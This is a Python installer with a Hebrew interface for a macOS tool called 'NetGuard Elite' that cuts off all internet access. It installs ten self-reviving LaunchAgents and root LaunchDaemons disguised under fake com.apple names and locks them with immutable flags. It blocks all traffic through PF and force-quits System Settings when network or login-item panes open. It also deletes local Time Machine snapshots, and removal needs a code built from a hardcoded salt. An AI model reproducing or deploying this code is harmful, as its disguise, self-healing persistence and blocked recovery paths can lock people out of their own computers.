import tkinter as tk
from tkinter import messagebox
import subprocess
import os
import random
import hashlib
import json
import shutil
import time

# --- מפתח סודי ---
SECRET_SALT = "GhostSystemKey2025"

# ==========================================
# 1. תצורת הרשת (User Agents - שומרי המשתמש)
# ==========================================
GHOST_NETWORK = [
    {
        "id": 0,
        "path": "/Users/Shared/.Config/sys_net_daemon", 
        "plist_path": "/Library/LaunchAgents/com.apple.sys.net.daemon.plist",
        "label": "com.apple.sys.net.daemon"
    },
    {
        "id": 1,
        "path": "/Users/Shared/.Config/sys_update_service",
        "plist_path": "/Library/LaunchAgents/com.apple.sys.update.helper.plist",
        "label": "com.apple.sys.update.helper"
    },
    {
        "id": 2,
        "path": "/Users/Shared/.Config/kernel_audit_d",
        "plist_path": "/Library/LaunchAgents/com.apple.kernel.audit.plist",
        "label": "com.apple.kernel.audit"
    },
    {
        "id": 3,
        "path": "/Users/Shared/.Config/mdworker_sys_ext",
        "plist_path": "/Library/LaunchAgents/com.apple.mdworker.sys.ext.plist",
        "label": "com.apple.mdworker.sys.ext"
    },
    {
        "id": 4,
        "path": "/Users/Shared/.Config/core_audio_d",
        "plist_path": "/Library/LaunchAgents/com.apple.core.audio.daemon.plist",
        "label": "com.apple.core.audio.daemon"
    }
]

# ==========================================
# 2. תצורת ה-Daemons (Root Enforcers - השוטרים)
# ==========================================
ROOT_DAEMON_NETWORK = [
    {
        "id": 0,
        "path": "/Library/PrivilegedHelperTools/com.apple.net.shield.daemon",
        "plist_path": "/Library/LaunchDaemons/com.apple.net.shield.daemon.plist",
        "label": "com.apple.net.shield.daemon"
    },
    {
        "id": 1,
        "path": "/Library/PrivilegedHelperTools/com.apple.sys.firewall.guard",
        "plist_path": "/Library/LaunchDaemons/com.apple.sys.firewall.guard.plist",
        "label": "com.apple.sys.firewall.guard"
    },
    {
        "id": 2,
        "path": "/Library/PrivilegedHelperTools/com.apple.network.integrity",
        "plist_path": "/Library/LaunchDaemons/com.apple.network.integrity.plist",
        "label": "com.apple.network.integrity"
    },
    {
        "id": 3,
        "path": "/Library/PrivilegedHelperTools/com.apple.wifi.secure.helper",
        "plist_path": "/Library/LaunchDaemons/com.apple.wifi.secure.helper.plist",
        "label": "com.apple.wifi.secure.helper"
    },
    {
        "id": 4,
        "path": "/Library/PrivilegedHelperTools/com.apple.packet.filter.d",
        "plist_path": "/Library/LaunchDaemons/com.apple.packet.filter.d.plist",
        "label": "com.apple.packet.filter.d"
    }
]

NETWORK_JSON = json.dumps(GHOST_NETWORK)
ROOT_NETWORK_JSON = json.dumps(ROOT_DAEMON_NETWORK)

# ==========================================
# 3. לוגיקת השוטרים (Root Enforcer Logic)
# כולל: חסימת אינטרנט + חסימת הגדרות + החייאת שוטרים אחרים
# ==========================================
ENFORCER_LOGIC = r"""
import subprocess
import time
import os
import json
import sys

# נתונים מוזרקים
MY_ID = __MY_ID_PLACEHOLDER__
USER_NETWORK_CONFIG = __NETWORK_CONFIG_PLACEHOLDER__
ROOT_NETWORK_CONFIG = __ROOT_NETWORK_CONFIG_PLACEHOLDER__
ENFORCER_CODE_TEMPLATE = __ENFORCER_REPR_PLACEHOLDER__

# --- פונקציות חסימה ---

def enforce_internet_block():
    # הפעלת חומת האש של מק (PF) עם חוק חסימה מוחלט
    try:
        # שימוש בנתיב המלא: /bin/echo ו-/sbin/pfctl
        cmd = '/bin/echo "block drop quick all" | /sbin/pfctl -f -'
        subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
        # שימוש בנתיב המלא להפעלת ה־PF
        subprocess.run('/sbin/pfctl -e', shell=True, stderr=subprocess.DEVNULL)
    except: 
        # מומלץ להחליף את זה ב-logging או הדפסה ל-sys.stderr לצורך ניפוי שגיאות
        pass

def protect_system_settings():
    # הגנה על הגדרות המערכת שלא יסירו את החסימה
    check_script = '''
    tell application "System Events"
        if exists process "System Settings" then
            tell process "System Settings"
                set winList to name of every window
            end tell
            return winList
        else
            return "NOT_RUNNING"
        end if
    end tell
    '''
    try:
        result = subprocess.check_output(['osascript', '-e', check_script], stderr=subprocess.DEVNULL).decode().strip()
        if result == "NOT_RUNNING":
            return

        # מילים מסוכנות בכותרות החלונות
        forbidden_terms = [
            "Login Items", "Extensions", "פריטי התחברות", "הרחבות", 
            "Network", "רשת", "Wi-Fi", "VPN", "Firewall"‫,‬ "Accessibility", "נגישות"
        ]
        
        should_kill = False
        for term in forbidden_terms:
            if term in result:
                should_kill = True
                break
        
        if should_kill:
            subprocess.run("killall 'System Settings'", shell=True, stderr=subprocess.DEVNULL)
    except: pass

# --- לוגיקת המעגל (Ring Protection) ---

def get_next_root_node():
    # כל שוטר שומר על הבא בתור (0->1->2->3->4->0)
    next_id = 0 if MY_ID == 4 else MY_ID + 1
    return ROOT_NETWORK_CONFIG[next_id]

def get_current_user_uid():
    try:
        user = subprocess.check_output("stat -f%Su /dev/console", shell=True).decode().strip()
        if user == "root": return None
        uid = subprocess.check_output(f"id -u {user}", shell=True).decode().strip()
        return uid
    except:
        return None

def create_daemon_plist(node):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{node['label']}</string>
    <key>ProgramArguments</key>
    <array><string>/usr/bin/python3</string><string>{node['path']}</string></array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict>
</plist>'''

def ensure_root_buddy_exists_and_running(node):
    # וידוא פיזי שהקובץ קיים
    recreated = False
    
    if not os.path.exists(node['path']):
        try:
            # שחזור קוד השוטר החבר
            code = ENFORCER_CODE_TEMPLATE.replace("__MY_ID_PLACEHOLDER__", str(node['id']))
            code = code.replace("__NETWORK_CONFIG_PLACEHOLDER__", json.dumps(USER_NETWORK_CONFIG))
            code = code.replace("__ROOT_NETWORK_CONFIG_PLACEHOLDER__", json.dumps(ROOT_NETWORK_CONFIG))
            code = code.replace("__ENFORCER_REPR_PLACEHOLDER__", repr(ENFORCER_CODE_TEMPLATE))
            
            os.makedirs(os.path.dirname(node['path']), exist_ok=True)
            with open(node['path'], "w") as f:
                f.write(code)
            subprocess.run(f"chmod 755 '{node['path']}'", shell=True)
            subprocess.run(f"chflags schg '{node['path']}'", shell=True)
            recreated = True
        except: pass

    if not os.path.exists(node['plist_path']):
        try:
            with open(node['plist_path'], "w") as f:
                f.write(create_daemon_plist(node))
            subprocess.run(f"chmod 644 '{node['plist_path']}'", shell=True)
            recreated = True
        except: pass
        
    # בדיקת סטטוס והפעלה מחדש
    is_running = False
    try:
        subprocess.check_output(f"launchctl list {node['label']}", shell=True, stderr=subprocess.DEVNULL)
        is_running = True
    except:
        is_running = False

    if recreated or not is_running:
        try:
            subprocess.run(f"launchctl bootstrap system '{node['plist_path']}'", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"launchctl kickstart -k system/{node['label']}", shell=True, stderr=subprocess.DEVNULL)
        except: pass
        
        # אם עדיין לא עובד - מחיקה והתקנה מחדש (Re-Write)
        time.sleep(0.4)
        try:
            subprocess.check_output(f"launchctl list {node['label']}", shell=True, stderr=subprocess.DEVNULL)
        except:
            try:
                subprocess.run(f"chflags noschg '{node['path']}'", shell=True)
                os.remove(node['path'])
                os.remove(node['plist_path'])
                subprocess.run(f"launchctl bootout system/{node['label']}", shell=True, stderr=subprocess.DEVNULL)
            except: pass

def enforce_user_agents():
    # השוטרים דואגים שגם סוכני המשתמש רצים
    uid = get_current_user_uid()
    if not uid: return

    for node in USER_NETWORK_CONFIG:
        try:
            cmd = f"launchctl bootstrap gui/{uid} '{node['plist_path']}'"
            subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
        except: pass

# --- לולאה ראשית של השוטר ---
counter = 0
while True:
    # 1. חסימת אינטרנט (רץ כל הזמן)
    enforce_internet_block()
    
    # 2. חסימת הגדרות (רץ כל הזמן)
    protect_system_settings()
    
    # 3. בדיקת המעגל (רץ כל כמה איטרציות כדי לא להעמיס)
    if counter % 10 == 0:
        target_node = get_next_root_node()
        ensure_root_buddy_exists_and_running(target_node)
        enforce_user_agents()
        counter = 0
        
    counter += 1
    time.sleep(0.5)
"""

# ==========================================
# 4. לוגיקת סוכני המשתמש (User Watchers)
# רק דואגים אחד לשני, כשכבת גיבוי
# ==========================================
WATCHER_TEMPLATE = """
import subprocess
import os
import time
import json
import sys

MY_ID = __MY_ID_PLACEHOLDER__
NETWORK_CONFIG = __NETWORK_CONFIG_PLACEHOLDER__
WATCHER_CODE_TEMPLATE = __WATCHER_REPR_PLACEHOLDER__

def get_next_node():
    next_id = 0 if MY_ID == 4 else MY_ID + 1
    return NETWORK_CONFIG[next_id]

def create_plist_content(node):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{node['label']}</string>
    <key>ProgramArguments</key>
    <array><string>/usr/bin/python3</string><string>{node['path']}</string></array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict>
</plist>'''

def restore_node(node):
    if not os.path.exists(node['path']):
        try:
            content = WATCHER_CODE_TEMPLATE.replace("__MY_ID_PLACEHOLDER__", str(node['id']))
            content = content.replace("__NETWORK_CONFIG_PLACEHOLDER__", json.dumps(NETWORK_CONFIG))
            
            os.makedirs(os.path.dirname(node['path']), exist_ok=True)
            with open(node['path'], "w") as f:
                f.write(content)
            subprocess.run(f"chmod 755 '{node['path']}'", shell=True)
            subprocess.run(f"chflags schg '{node['path']}'", shell=True)
        except: pass

    if not os.path.exists(node['plist_path']):
        try:
            with open(node['plist_path'], "w") as f:
                f.write(create_plist_content(node))
            subprocess.run(f"chmod 644 '{node['plist_path']}'", shell=True)
            uid = subprocess.check_output("id -u", shell=True).decode().strip()
            subprocess.run(f"launchctl bootstrap gui/{uid} '{node['plist_path']}'", shell=True)
        except: pass

def main_loop():
    while True:
        restore_node(get_next_node())
        time.sleep(2)

if __name__ == "__main__":
    main_loop()
"""

# ==========================================
# 5. פונקציות עזר להתקנה והסרה
# ==========================================

def run_admin_shell_script(script_content):
    tmp_script = "/tmp/ghost_run.sh"
    try:
        with open(tmp_script, "w") as f:
            f.write(script_content)
        os.chmod(tmp_script, 0o755)
        
        apple_script_cmd = f'do shell script "sh {tmp_script}" with administrator privileges'
        
        result = subprocess.run(
            ["osascript", "-e", apple_script_cmd],
            capture_output=True, text=True
        )
        if os.path.exists(tmp_script):
            os.remove(tmp_script)
        if result.returncode != 0:
            raise Exception(f"Admin execution failed: {result.stderr}")
    except Exception as e:
        raise e

def create_plist_str_daemon(label, program_path):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array><string>/usr/bin/python3</string><string>{program_path}</string></array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict>
</plist>"""

def create_plist_str_agent(label, program_path):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array><string>/usr/bin/python3</string><string>{program_path}</string></array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict>
</plist>"""

def calculate_unlock_code(challenge_str):
    combined = challenge_str + SECRET_SALT
    hash_obj = hashlib.sha256(combined.encode())
    return hash_obj.hexdigest()[:6]

def ask_unlock_code_native(challenge_code):
    prompt_text = f":קוד מערכת {challenge_code}\\n\\n:לשחרור החסימה הכנס קוד נגדי"
    script = f'''set theResponse to display dialog "{prompt_text}" default answer "" with title "NetGuard Elite Unlock" buttons {{"ביטול", "אישור"}} default button "אישור" with icon stop
    return text returned of theResponse'''
    
    try:
        result = subprocess.run(
            ['osascript', '-e', script],
            capture_output=True,
            text=True,
            check=True
        )
        return result.stdout.strip()
    except subprocess.CalledProcessError:
        return None
    except Exception as e:
        messagebox.showerror("שגיאה", f"תקלה בדיאלוג: {e}")
        return None

def install():
    if not agree_var.get():
        messagebox.showwarning("אזהרה", "עליך לאשר את תנאי השימוש כדי להמשיך.")
        return
    
    staging_dir = "/tmp/ghost_staging"
    if os.path.exists(staging_dir):
        shutil.rmtree(staging_dir)
    os.makedirs(staging_dir)

    # הכנת הקוד להזרקה
    enforcer_repr = repr(ENFORCER_LOGIC)
    watcher_repr = repr(WATCHER_TEMPLATE)

    # 1. יצירת סוכני המשתמש (User Agents)
    for i in range(5):
        node = GHOST_NETWORK[i]
        code = WATCHER_TEMPLATE.replace("__MY_ID_PLACEHOLDER__", str(node['id']))
        code = code.replace("__NETWORK_CONFIG_PLACEHOLDER__", NETWORK_JSON)
        code = code.replace("__WATCHER_REPR_PLACEHOLDER__", watcher_repr)
        
        with open(f"{staging_dir}/user_{i}.py", "w") as f:
            f.write(code)
        with open(f"{staging_dir}/user_{i}.plist", "w") as f:
            f.write(create_plist_str_agent(node['label'], node['path']))

    # 2. יצירת השוטרים (Root Enforcers)
    for i in range(5):
        d_node = ROOT_DAEMON_NETWORK[i]
        code = ENFORCER_LOGIC.replace("__MY_ID_PLACEHOLDER__", str(d_node['id']))
        code = code.replace("__NETWORK_CONFIG_PLACEHOLDER__", NETWORK_JSON)
        code = code.replace("__ROOT_NETWORK_CONFIG_PLACEHOLDER__", ROOT_NETWORK_JSON)
        code = code.replace("__ENFORCER_REPR_PLACEHOLDER__", enforcer_repr)
        
        with open(f"{staging_dir}/root_{i}.py", "w") as f:
            f.write(code)
        with open(f"{staging_dir}/root_{i}.plist", "w") as f:
            f.write(create_plist_str_daemon(d_node['label'], d_node['path']))

    # 3. סקריפט התקנה (Bash)
    bash_script = "#!/bin/bash\n"
    bash_script += f"STAGING='{staging_dir}'\n"
    bash_script += "tmutil deletelocalsnapshots / || true\n" # מחיקת נקודות שחזור
    bash_script += "TARGET_USER=$(logname)\n"
    bash_script += "TARGET_UID=$(id -u $TARGET_USER)\n"

    # התקנת סוכני משתמש
    for i, node in enumerate(GHOST_NETWORK):
        folder = os.path.dirname(node['path'])
        bash_script += f"mkdir -p '{folder}'\n"
        bash_script += f"chmod 755 '{folder}'\n"
        bash_script += f"mv \"$STAGING/user_{i}.py\" '{node['path']}'\n"
        bash_script += f"chmod 755 '{node['path']}'\n"
        bash_script += f"mv \"$STAGING/user_{i}.plist\" '{node['plist_path']}'\n"
        bash_script += f"chown $TARGET_USER:staff '{node['plist_path']}'\n"
        bash_script += f"chmod 644 '{node['plist_path']}'\n"
        bash_script += f"launchctl bootstrap gui/$TARGET_UID '{node['plist_path']}'\n"
        bash_script += f"chflags schg '{node['path']}'\n"
        bash_script += f"chflags schg '{node['plist_path']}'\n"

    # התקנת שוטרים (Root)
    for i, d_node in enumerate(ROOT_DAEMON_NETWORK):
        daemon_folder = os.path.dirname(d_node['path'])
        bash_script += f"mkdir -p '{daemon_folder}'\n"
        bash_script += f"mv \"$STAGING/root_{i}.py\" '{d_node['path']}'\n"
        bash_script += f"chmod 755 '{d_node['path']}'\n"
        bash_script += f"mv \"$STAGING/root_{i}.plist\" '{d_node['plist_path']}'\n"
        bash_script += f"chown root:wheel '{d_node['plist_path']}'\n"
        bash_script += f"chmod 644 '{d_node['plist_path']}'\n"
        bash_script += f"launchctl bootstrap system '{d_node['plist_path']}'\n"
        bash_script += f"chflags schg '{d_node['path']}'\n"
        bash_script += f"chflags schg '{d_node['plist_path']}'\n"

    bash_script += f"rm -rf {staging_dir}\n"

    try:
        run_admin_shell_script(bash_script)
        messagebox.showinfo("הצלחה", "חסימת האינטרנט המשוריינת (NetGuard Elite) הותקנה.")
    except Exception as e:
        messagebox.showerror("שגיאה", f"ההתקנה נכשלה: {e}")

def uninstall():
    challenge_code = str(random.randint(10000, 99999))
    correct_response = calculate_unlock_code(challenge_code)
    
    user_input = ask_unlock_code_native(challenge_code)
    
    if user_input is None:
        return 

    if user_input.strip() == correct_response:
        
        bash_script = "#!/bin/bash\n"
        bash_script += "TARGET_USER=$(logname)\n"
        bash_script += "TARGET_UID=$(id -u $TARGET_USER)\n"
        
        # 1. הסרת השוטרים (Root)
        for d_node in ROOT_DAEMON_NETWORK:
            bash_script += f"launchctl bootout system '{d_node['plist_path']}' 2>/dev/null || true\n"
            bash_script += f"chflags noschg '{d_node['path']}'\n"
            bash_script += f"chflags noschg '{d_node['plist_path']}'\n"
            bash_script += f"rm -f '{d_node['path']}'\n"
            bash_script += f"rm -f '{d_node['plist_path']}'\n"
            
        # 2. הסרת סוכני משתמש
        for node in GHOST_NETWORK:
            bash_script += f"launchctl bootout gui/$TARGET_UID '{node['plist_path']}' 2>/dev/null || true\n"
            bash_script += f"pkill -9 -f '{node['path']}'\n"
            bash_script += f"chflags noschg '{node['path']}'\n"
            bash_script += f"chflags noschg '{node['plist_path']}'\n"
            bash_script += f"rm -f '{node['path']}'\n"
            bash_script += f"rm -f '{node['plist_path']}'\n"
            folder = os.path.dirname(node['path'])
            bash_script += f"rmdir '{folder}' 2>/dev/null || true\n"

        # 3. ביטול חסימת רשת (PF)
        bash_script += "pfctl -F all\n"
        bash_script += "pfctl -d\n"

        bash_script += 'echo "--- SYSTEM CLEANED ---"'

        try:
            run_admin_shell_script(bash_script)
            messagebox.showinfo("הצלחה", "החסימה הוסרה והאינטרנט שוחרר.")
        except Exception as e:
            messagebox.showerror("שגיאה", f"שגיאה בהסרה: {e}")
    else:
        messagebox.showerror("שגיאה", "קוד שגוי.")

# --- GUI ---
root = tk.Tk()
root.title("NetGuard Elite Installer")
root.geometry("450x500")

tk.Label(root, text="NetGuard Elite", font=("Helvetica", 18, "bold")).pack(pady=10)
tk.Label(root, text="Total Internet Lock + Ring Protection", font=("Helvetica", 10, "italic")).pack()

# --- תיבת אזהרה ---
warning_frame = tk.Frame(root, highlightbackground="red", highlightthickness=2, bd=0, padx=10, pady=10, bg="#fff5f5")
warning_frame.pack(pady=15, padx=20, fill="x")

lbl_warn_title = tk.Label(warning_frame, text="⚠️ אזהרה: חסימת אינטרנט הרמטית ⚠️", font=("Arial", 12, "bold"), fg="red", bg="#fff5f5")
lbl_warn_title.pack(anchor="center")

warning_text = (
    "תוכנה זו מנתקת את האינטרנט לחלוטין.\n"
    "גם חלון הגדרות הרשת ייחסם לגישה.\n"
    "ייתכן ולא תוכלו להסיר את התוכנה.\n"
    "השימוש באחריותך הבלעדית."
)
lbl_warn_body = tk.Label(warning_frame, text=warning_text, font=("Arial", 10), justify="center", bg="#fff5f5")
lbl_warn_body.pack(pady=5)

agree_var = tk.IntVar()
check_text = "אני מבין את הסיכונים ומאשר את חסימת האינטרנט."
cb = tk.Checkbutton(root, text=check_text, variable=agree_var, onvalue=1, offvalue=0, wraplength=380, justify="center", font=("Arial", 10, "bold"))
cb.pack(pady=10)

btn_install = tk.Button(
    root, 
    text="התקן חסימת אינטרנט", 
    command=install, 
    bg="#ff3333", 
    fg="black", 
    font=("Helvetica", 13, "bold"), 
    width=25,
    height=2,
    highlightbackground="#ff3333"
)
btn_install.pack(pady=5)

tk.Frame(root, height=1, bg="#ccc").pack(fill="x", padx=40, pady=15)

btn_uninstall = tk.Button(root, text="שחרור חסימה (דורש קוד)", command=uninstall, font=("Helvetica", 10))
btn_uninstall.pack(pady=5)

root.mainloop()